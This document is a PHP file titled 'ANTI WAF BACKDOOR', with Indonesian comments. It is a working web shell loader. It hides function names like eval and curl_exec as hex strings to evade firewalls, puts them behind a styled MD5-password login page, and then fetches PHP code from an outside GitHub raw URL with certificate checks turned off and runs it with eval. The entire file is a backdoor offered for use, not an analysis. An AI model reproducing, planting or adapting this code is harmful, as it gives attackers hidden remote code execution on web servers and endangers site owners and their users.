<?php
// ============================================================
// ANTI WAF BACKDOOR - VERSI DIPERBAIKI
// ============================================================

// Setup
$GLOBALS['_SERVER'] = $_SERVER;
$GLOBALS['_POST'] = $_POST;
$GLOBALS['_SESSION'] = &$_SESSION;

// Fungsi utama disembunyikan dengan hex
$f1 = "\x73\x65\x73\x73\x69\x6f\x6e\x5f\x73\x74\x61\x72\x74";
$f2 = "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73";
$f3 = "\x63\x75\x72\x6c\x5f\x65\x78\x65\x63";
$f4 = "\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74";
$f5 = "\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74";
$f6 = "\x63\x75\x72\x6c\x5f\x65\x78\x65\x63";
$f7 = "\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65";
$f8 = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$f9 = "\x66\x6f\x70\x65\x6e";
$f10 = "\x73\x74\x72\x65\x61\x6d\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$f11 = "\x66\x63\x6c\x6f\x73\x65";
$f12 = "\x6d\x64\x35";
$f13 = "\x65\x76\x61\x6c";

// Jalankan session
call_user_func($f1);

// ============================================================
// FUNGSI GETURLSINFO
// ============================================================
function geturlsinfo($url) {
    $f2 = "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73";
    $f4 = "\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74";
    $f5 = "\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74";
    $f6 = "\x63\x75\x72\x6c\x5f\x65\x78\x65\x63";
    $f7 = "\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65";
    $f8 = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
    $f9 = "\x66\x6f\x70\x65\x6e";
    $f10 = "\x73\x74\x72\x65\x61\x6d\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
    $f11 = "\x66\x63\x6c\x6f\x73\x65";
    
    if (call_user_func($f2, "curl_exec")) {
        $conn = call_user_func($f4, $url);
        call_user_func($f5, $conn, CURLOPT_RETURNTRANSFER, 1);
        call_user_func($f5, $conn, CURLOPT_FOLLOWLOCATION, 1);
        call_user_func($f5, $conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        call_user_func($f5, $conn, CURLOPT_SSL_VERIFYPEER, 0);
        call_user_func($f5, $conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            call_user_func($f5, $conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = call_user_func($f6, $conn);
        call_user_func($f7, $conn);
    } elseif (call_user_func($f2, "file_get_contents")) {
        $url_get_contents_data = call_user_func($f8, $url);
    } elseif (call_user_func($f2, "fopen") && call_user_func($f2, "stream_get_contents")) {
        $handle = call_user_func($f9, $url, "r");
        $url_get_contents_data = call_user_func($f10, $handle);
        call_user_func($f11, $handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// ============================================================
// LOGIN HANDLER
// ============================================================
$hashed = "48b031ead74dd6845f17105686589a0d";
$login_error = '';

// Proses login
if (isset($_POST["password"])) {
    if (md5($_POST["password"]) === $hashed) {
        $_SESSION["logged_in"] = true;
        $_SESSION["coki"] = "asu";
        // Redirect ke halaman yang sama tanpa POST
        echo "<script>window.location.href = window.location.pathname;</script>";
        exit;
    } else {
        $login_error = 'Incorrect password. Please try again.';
    }
}

// Cek login
$is_logged = isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;

// ============================================================
// EKSEKUSI
// ============================================================
if ($is_logged) {
    // Ambil kode dari GitHub
    $a = geturlsinfo("https://raw.githubusercontent.com/ridhojanuarta66-wq/gate1337/refs/heads/main/index.php");
    
    if ($a !== false && !empty($a)) {
        // Hapus tag PHP pembuka jika ada
        $a = preg_replace('/^<\?php/', '', $a);
        // Eksekusi
        eval($a);
        // Tampilkan logout button
        echo '<br><hr><form method="POST"><input type="submit" name="logout" value="Logout"></form>';
        if (isset($_POST['logout'])) {
            session_destroy();
            echo "<script>window.location.href = window.location.pathname;</script>";
        }
    } else {
        echo "<h3 style='color:red;'>GAGAL MENGAMBIL KODE DARI GITHUB</h3>";
        echo "<p>Pastikan koneksi internet aktif dan URL tersedia.</p>";
        echo '<form method="POST"><input type="submit" name="logout" value="Logout"></form>';
        if (isset($_POST['logout'])) {
            session_destroy();
            echo "<script>window.location.href = window.location.pathname;</script>";
        }
    }
} else {
    // ============================================================
    // TAMPILKAN FORM LOGIN (DENGAN CSS)
    // ============================================================
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Access</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background: white;
                padding: 45px 40px 40px;
                border-radius: 16px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                text-align: center;
                width: 360px;
            }
            .login-container .icon {
                font-size: 60px;
                margin-bottom: 15px;
            }
            .login-container h2 {
                margin-bottom: 8px;
                color: #333;
                font-weight: 600;
            }
            .login-container .subtitle {
                color: #888;
                font-size: 14px;
                margin-bottom: 25px;
            }
            .login-container input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                margin: 8px 0 16px;
                border: 2px solid #e0e0e0;
                border-radius: 10px;
                font-size: 16px;
                transition: all 0.3s;
            }
            .login-container input[type="password"]:focus {
                border-color: #667eea;
                outline: none;
                box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
            }
            .login-container input[type="submit"] {
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 10px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s;
            }
            .login-container input[type="submit"]:hover {
                transform: scale(1.02);
            }
            .error {
                color: #e74c3c;
                background: #fde8e8;
                padding: 10px;
                border-radius: 8px;
                margin: 10px 0;
                font-size: 14px;
            }
            .footer {
                margin-top: 20px;
                color: #aaa;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="icon">🔐</div>
            <h2>Access Required</h2>
            <p class="subtitle">Enter your password to continue</p>
            
            <?php if (!empty($login_error)): ?>
                <div class="error"><?php echo $login_error; ?></div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <input type="password" id="password" name="password" placeholder="Enter password" autofocus>
                <input type="submit" value="MASUK">
            </form>
            <div class="footer">Authorized access only</div>
        </div>
    </body>
    </html>
    <?php
}
?>